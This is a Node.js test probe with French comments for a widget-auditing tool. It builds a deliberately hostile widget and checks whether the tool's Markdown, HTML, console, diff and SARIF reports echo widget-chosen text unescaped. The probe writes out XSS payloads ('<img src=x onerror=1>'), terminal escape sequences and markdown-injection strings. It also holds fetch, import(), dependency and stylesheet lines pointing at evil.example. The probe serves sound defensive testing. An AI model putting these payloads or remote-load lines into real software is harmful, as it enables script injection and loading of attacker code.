#!/usr/bin/env node
/**
 * Sonde : quels textes que le widget choisit arrivent tels quels dans les sorties de l'outil ?
 *
 * Construit un widget hostile qui porte un repère unique (PWN1, PWN2, …) dans chaque endroit où une règle recopie un texte que le widget choisit : un nom de
 * propriété, l'émetteur d'un JWT, une adresse de `fetch`, d'`import()`, de `postMessage`, un `eval`, un `innerHTML`, une clé de stockage, un nom de dépendance, un
 * nom de fichier, le nom du dépôt. Chaque texte porte aussi du balisage (`<img src=x onerror=1>`, `<b>`), des guillemets inversés, un saut de ligne ou un
 * caractère d'échappement de terminal, ce qu'une sortie lirait autrement que comme du texte. L'outil est lancé sur ce widget (sans axe D ni réseau, avec les
 * sorties JSON et SARIF), puis la sonde écrit ce qu'elle voit :
 *   - dans quels champs de quels constats chaque repère se retrouve, et comment `rapport.md` rend ce champ ;
 *   - les lignes de `rapport.md` où un repère est hors de tout code (un titre, un paragraphe) et celles qui commencent par ce que le widget a écrit ;
 *   - si `rapport.html` porte une balise venue du widget à nu ;
 *   - ce que la console et `--diff` écrivent (un repère, un caractère de contrôle) ;
 *   - les repères du SARIF (une donnée JSON, non du Markdown).
 * La sonde ne juge rien : elle dit ce qu'elle voit. Un texte du widget qui sort sans être cité est un trou du rapport Markdown, de la console ou de `--diff`
 * (voir l'en-tête de `src/moteur/texte-du-widget.js`). Elle sort en code 0 si l'outil a rendu ses rapports, en code 1 sinon, jamais pour ce qu'elle a vu.
 * Aucune clé n'est écrite dans ce fichier : le jeton de rôle anonyme et la valeur d'allure générée sont assemblés à l'exécution, avec le même tirage à chaque
 * lancement.
 *
 * Le widget se fabrique à l'exécution, dans un dossier temporaire : aucun fichier du dépôt n'a un nom que le système de fichiers de Windows refuse. Sous Windows,
 * qui refuse `<`, `>` et les caractères de contrôle dans un nom de fichier, la sonde le dit et sort en code 1 plutôt que de fabriquer un widget moins hostile.
 *
 * Usage : node scripts/sonder-texte-du-widget.mjs [racine de l'outil à sonder, par défaut ce dépôt] [--garder]
 *   --garder : ne pas effacer le dossier de la sonde (le widget, ses rapports), dont le chemin est écrit à la fin.
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';

if (process.platform === 'win32') {
  console.error('sonder-texte-du-widget : sous Windows, le système refuse `<`, `>` et les caractères de contrôle dans un nom de fichier ; la sonde ne sait pas fabriquer son widget hostile ici.');
  process.exit(1);
}
const arguments_ = process.argv.slice(2);
const garder = arguments_.includes('--garder');
const positionnels = arguments_.filter((a) => !a.startsWith('--'));
const racineOutil = path.resolve(positionnels[0] ?? path.join(path.dirname(fileURLToPath(import.meta.url)), '..'));
const BIN = path.join(racineOutil, 'bin/gwaudit.js');
if (!fs.existsSync(BIN)) {
  console.error(`sonder-texte-du-widget : pas de bin/gwaudit.js dans ${racineOutil}`);
  process.exit(1);
}
const parent = fs.mkdtempSync(path.join(process.env.TMPDIR ?? os.tmpdir(), 'sonde-texte-'));
const widgetDir = path.join(parent, 'PWN8 <img src=x onerror=1> `d` \u001b[31m');
fs.mkdirSync(widgetDir, { recursive: true });

// Un tirage toujours le même (mulberry32, graine fixe) : la valeur d'allure générée et le jeton se retrouvent à l'identique à chaque lancement.
const ALNUM = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
let x = 20261001;
const alea = () => { x = (x + 0x6d2b79f5) >>> 0; let t = x; t = Math.imul(t ^ (t >>> 15), t | 1); t ^= t + Math.imul(t ^ (t >>> 7), t | 61); return ((t ^ (t >>> 14)) >>> 0) / 4294967296; };
const tirer = (n) => Array.from({ length: n }, () => ALNUM[Math.floor(alea() * ALNUM.length)]).join('');
const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
const jwt = (charge) => `${b64({ alg: 'HS256', typ: 'JWT' })}.${b64(charge)}.${tirer(43)}`;

// Le nom de ce fichier porte deux repères : PWN7 avant le guillemet inversé (dans l'extrait de code en ligne que le nom ouvre) et PWN15 après (là où cet extrait
// se ferme, donc hors de tout code).
const nomFichier = 'PWN7<b>x`PWN15<i>y\u001b[32m.js';
const app = [
  `const o1 = { ${JSON.stringify('PWN1`a\n# PWN1titre token')}: ${JSON.stringify(tirer(32))} };`,
  `const cle = '${jwt({ iss: 'PWN2 <b>x</b>\n# PWN2titre', role: 'anon' })}';`,
  `fetch(${JSON.stringify('https://evil.example/PWN3<img src=x onerror=1>/a`b')});`,
  `eval(${JSON.stringify('PWN4 <img src=x onerror=1> `x`')});`,
  `document.body.innerHTML = ${JSON.stringify('PWN5 <img src=x onerror=1>')};`,
  `window.parent.postMessage({ a: 1 }, ${JSON.stringify('https://PWN9<img>.example')});`,
  `localStorage.setItem(${JSON.stringify('PWN10<img>')}, '1');`,
  `import(${JSON.stringify('https://evil.example/PWN11<img>.js')});`,
  `grist.ready({ columns: [${JSON.stringify('PWN14<img>')}], requiredAccess: 'full' });`,
].join('\n') + '\n';
fs.writeFileSync(path.join(widgetDir, 'app.js'), app);
fs.writeFileSync(path.join(widgetDir, nomFichier), 'eval(1);\n');
fs.writeFileSync(path.join(widgetDir, 'package.json'), JSON.stringify({ name: 'w', dependencies: { 'PWN6<img>': 'https://evil.example/PWN6b.tgz' } }));
fs.writeFileSync(path.join(widgetDir, 'index.html'), `<!doctype html><html lang="fr"><head><title>t</title>
<style>@import url("https://evil.example/PWN12<img>.css");</style>
<script src="https://cdn.PWN13.example/<img>.js"></script>
</head><body><script src="app.js"></script><script src="${encodeURIComponent(nomFichier).replace(/'/g, '%27')}"></script></body></html>\n`);

const sortie = path.join(parent, 'sortie');
const r = spawnSync(process.execPath, [BIN, widgetDir, '--sans-dynamique', '--sans-reseau', '--json', '--sarif', '--sortie', sortie], { encoding: 'utf8', timeout: 180000 });
console.log(`gwaudit : sortie ${r.status}, stdout ${r.stdout.length} octets, stderr ${r.stderr.length} octets`);
const lire = (n) => fs.readFileSync(path.join(sortie, n), 'utf8');
let json, md, html, sarif;
try {
  json = JSON.parse(lire('rapport.json'));
  md = lire('rapport.md');
  html = lire('rapport.html');
  sarif = lire('rapport.sarif');
} catch (erreur) {
  console.error(`sonder-texte-du-widget : l'outil n'a pas rendu ses rapports (${erreur.message})\n${r.stderr.slice(0, 2000)}`);
  process.exit(1);
}
const constats = Object.values(json.axes).flatMap((a) => a.constats ?? []);
console.log(`${constats.length} constats`);

const reperes = ['PWN1', 'PWN2', 'PWN3', 'PWN4', 'PWN5', 'PWN6', 'PWN7', 'PWN8', 'PWN9', 'PWN10', 'PWN11', 'PWN12', 'PWN13', 'PWN14', 'PWN15'];
const champs = ['titre', 'constat', 'impact', 'remediation', 'extrait', 'fichier'];
const rendu = { titre: 'titre de section (ligne `### …`), brut', constat: 'paragraphe, brut', impact: 'paragraphe, brut', remediation: 'paragraphe, brut', extrait: 'bloc de code (```), inerte sauf contrôle', fichier: 'extrait de code en ligne (`…`), un guillemet inversé le ferme' };
const trouve = new Map();
for (const c of constats) {
  for (const champ of champs) {
    const v = c[champ];
    if (typeof v !== 'string') continue;
    for (const rep of reperes) {
      if (new RegExp(`${rep}(?!\\d)`).test(v)) {
        const k = `${rep}\t${c.regle}\t${champ}`;
        trouve.set(k, (trouve.get(k) ?? 0) + 1);
      }
    }
  }
}
console.log('\nRepère\tRègle\tChamp du constat (nombre)\tMarkdown');
for (const [k, n] of [...trouve.entries()].sort()) {
  const [rep, regle, champ] = k.split('\t');
  console.log(`${rep}\t${regle}\t${champ} (${n})\t${rendu[champ]}`);
}

// Les lignes de rapport.md, chacune dite « dans un bloc de code » ou non (un bloc ouvert par au moins trois guillemets inversés, fermé par une barre au moins aussi
// longue, seule sur sa ligne : ce que le rendu de l'outil écrit ; la barre d'ouverture et celle de fermeture comptent comme du bloc).
function lignesDuMarkdown(texte) {
  let ouverte = 0;
  return texte.split('\n').map((l, i) => {
    const m = /^ {0,3}(`{3,})(.*)$/.exec(l);
    if (!ouverte) {
      if (m && !m[2].includes('`')) { ouverte = m[1].length; return { n: i + 1, l, dansBloc: true }; }
      return { n: i + 1, l, dansBloc: false };
    }
    if (m && m[1].length >= ouverte && m[2].trim() === '') ouverte = 0;
    return { n: i + 1, l, dansBloc: true };
  });
}
// Dans rapport.md, le repère hors de tout code (ligne hors bloc, hors extrait en ligne).
function brutsDansLeMarkdown(texte) {
  const sorties = [];
  for (const { n, l, dansBloc } of lignesDuMarkdown(texte)) {
    if (dansBloc) continue;
    const sansCode = l.replace(/(`+)[\s\S]*?\1(?!`)/g, '');
    for (const rep of reperes) if (new RegExp(`${rep}(?!\\d)`).test(sansCode)) sorties.push([rep, n, l.slice(0, 110)]);
  }
  return sorties;
}
const ecrire = (texte) => texte.replace(/[\u0000-\u001f]/g, (c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`);
console.log('\nrapport.md : lignes où un repère est hors de tout code');
for (const [rep, n, l] of brutsDansLeMarkdown(md)) console.log(`${rep}\tligne ${n}\t${ecrire(l)}`);
console.log('\nrapport.md : toutes les lignes qui portent un repère (110 premiers caractères, caractères de contrôle écrits)');
md.split('\n').forEach((l, i) => { if (/PWN\d/.test(l)) console.log(`   ${String(i + 1).padStart(4)}  ${ecrire(l.slice(0, 110))}`); });
// Une ligne hors bloc qui commence par ce que le widget a écrit (ou par du balisage qu'il a écrit) : un faux titre, une fausse liste, un faux tableau.
const aDebutDeLigne = lignesDuMarkdown(md).filter(({ l, dansBloc }) => !dansBloc && /^(#{1,6} PWN|<img|<b>|# PWN|\| *PWN|- PWN|PWN\d)/.test(l));
console.log(`lignes du Markdown, hors bloc de code, qui commencent par ce que le widget a écrit : ${aDebutDeLigne.length}`);
for (const { n, l } of aDebutDeLigne.slice(0, 8)) console.log(`   ${String(n).padStart(4)}  ${ecrire(l.slice(0, 110))}`);

// La page HTML : jamais une balise venue du widget.
console.log(`\nrapport.html : balise <img src=x onerror=1> à nu : ${html.includes('<img src=x onerror=1>') ? 'OUI' : 'non'} ; <img> à nu : ${/<img>/.test(html) ? 'OUI' : 'non'} ; <b>x : ${html.includes('<b>x') ? 'OUI' : 'non'}`);
// La console et la comparaison.
const controle = new RegExp('[\\u0000-\\u0008\\u000b-\\u001f\\u007f-\\u009f\\u2028\\u2029]');
console.log(`console : repères ${reperes.filter((rp) => (r.stdout + r.stderr).includes(rp)).join(',') || 'aucun'} ; caractère de contrôle (hors retour à la ligne) : ${controle.test((r.stdout + r.stderr))}`);
const propre = path.join(parent, 'propre');
fs.mkdirSync(propre);
fs.writeFileSync(path.join(propre, 'index.html'), '<!doctype html><html lang="fr"><head><title>t</title></head><body><script src="a.js"></script></body></html>');
fs.writeFileSync(path.join(propre, 'a.js'), 'var x = 1;\n');
const sortiePropre = path.join(parent, 'sortie-propre');
const r2 = spawnSync(process.execPath, [BIN, propre, '--sans-dynamique', '--sans-reseau', '--json', '--sortie', sortiePropre], { encoding: 'utf8', timeout: 180000 });
if (!fs.existsSync(path.join(sortiePropre, 'rapport.json'))) {
  console.error(`sonder-texte-du-widget : l'outil n'a pas rendu le rapport du widget propre (sortie ${r2.status})\n${r2.stderr.slice(0, 2000)}`);
  process.exit(1);
}
const d = spawnSync(process.execPath, [BIN, '--diff', path.join(sortie, 'rapport.json'), path.join(sortiePropre, 'rapport.json')], { encoding: 'utf8', timeout: 60000 });
console.log(`--diff : sortie ${d.status} ; repères ${reperes.filter((rp) => d.stdout.includes(rp)).join(',') || 'aucun'} ; caractère de contrôle : ${controle.test(d.stdout + d.stderr)}`);
console.log('\n--diff, lignes avec un repère :');
for (const l of d.stdout.split('\n').filter((l) => /PWN/.test(l)).slice(0, 12)) console.log('   ' + ecrire(l.slice(0, 140)));
console.log(`\nSARIF : repères ${reperes.filter((rp) => sarif.includes(rp)).join(',') || 'aucun'} (donnée JSON, pas du Markdown)`);
if (garder) console.log(`\n(dossier de la sonde : ${parent})`);
else fs.rmSync(parent, { recursive: true, force: true });
